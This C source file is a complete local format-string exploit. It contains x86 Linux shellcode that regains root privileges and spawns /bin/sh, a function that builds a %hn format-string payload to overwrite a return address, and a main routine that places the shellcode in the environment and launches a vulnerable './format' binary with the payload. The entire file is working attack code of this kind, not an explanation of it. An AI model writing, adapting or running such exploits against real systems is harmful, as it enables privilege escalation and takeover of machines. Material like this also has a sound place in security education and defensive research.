#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char buf[100];

char shellcode[] = 
"\x33\xc0"   /*   xorl   %eax,%eax   */
"\x31\xdb"   /*   xorl   %ebx,%ebx   */
"\xb0\x17"   /*   movb   $0x17,%al   */
"\xcd\x80"   /*   int    $0x80       */
"\x33\xc0"   /*   xorl   %eax,%eax   */
"\x31\xdb"   /*   xorl   %ebx,%ebx   */
"\xb0\x2e"   /*   movb   $0x2e,%al   */
"\xcd\x80"   /*   int    $0x80       */
"\x31\xc0"   /*   xorl   %eax,%eax   */
"\x50"       /*   pushl  %eax        */
"\x68""//sh" /*   pushl  $0x68732f2f */
"\x68""/bin" /*   pushl  $0x6e69622f */
"\x89\xe3"   /*   movl   %esp,%ebp   */
"\x50"       /*   pushl  %eax        */
"\x53"       /*   pushl  %ebx        */
"\x89\xe1"   /*   movl   %esp,%ecx   */
"\x99"       /*   cltd               */
"\xb0\x0b"   /*   movb   $0xb,%al    */
"\xcd\x80";  /*   int    $0x80       */


char *fmt_str_creator(long addr, long value, int pos) {

  char *buf;
  
  unsigned char byte1, byte2, byte3, byte4;
  unsigned long high, low;
  int length = 100;
  
  byte1 = (addr & 0xff000000) >> 24;
  byte2 = (addr & 0x00ff0000) >> 16;
  byte3 = (addr & 0x0000ff00) >> 8;
  byte4 = (addr & 0x000000ff);

  high = (value & 0xffff0000) >> 16;
  low =  (value & 0x0000ffff);

  fprintf(stderr, "addr:    %#x\n", addr);
  fprintf(stderr, "byte1:   %#x (%c)\n", byte1, byte1);
  fprintf(stderr, "byte2:   %#x (%c)\n", byte2, byte2);
  fprintf(stderr, "byte3:   %#x (%c)\n", byte3, byte3);
  fprintf(stderr, "byte4:   %#x (%c)\n", byte4, byte4);
  fprintf(stderr, "byte4+2: %#x (%c)\n", byte4+2, byte4+2);
  fprintf(stderr, "value:   %d (%#x)\n", value, value);
  fprintf(stderr, "high:    %d (%#x)\n", high, high);
  fprintf(stderr, "low:     %d (%#x)\n", low, low);
  fprintf(stderr, "pos: %d\n", pos);

  if ( !(buf = (char*)malloc(length*sizeof(char))) ) {
    perror("allocate buffer failed");
    exit(0);
  }

  memset(buf, 0, sizeof(buf));

  if (high < low) {

    snprintf(buf,
         length,
         "%c%c%c%c"
         "%c%c%c%c"

	 
         "%%.%hdx"
         "%%%d$hn"
	 
         "%%.%hdx"
         "%%%d$hn",

         byte4+2, byte3, byte2, byte1, 
         byte4, byte3, byte2, byte1, 

         high-8, 
         pos,

         low-high, 
         pos+1);

  } else {

     snprintf(buf,
         length,
         "%c%c%c%c"
         "%c%c%c%c"
	 
         "%%.%hdx"
         "%%%d$hn"
	 
         "%%.%hdx"
         "%%%d$hn",

         byte4+2, byte3, byte2, byte1, 
         byte4, byte3, byte2, byte1, 

         low-8, 
         pos+1,

         high-low, 
         pos);
  }
  return buf;

}

int main()
{
  char *env[] = {shellcode, NULL};
  char buff[100];
  long RET;
  long ADDRESS = 0x80495f8 + 4;
  int ALIGN = 6;

  RET = 0xc0000000 - strlen(shellcode) - strlen("./format") - 6;
  sprintf(buff,"%s",fmt_str_creator(ADDRESS, RET, ALIGN));

  execle("./format", "format", buff, NULL, env);
}
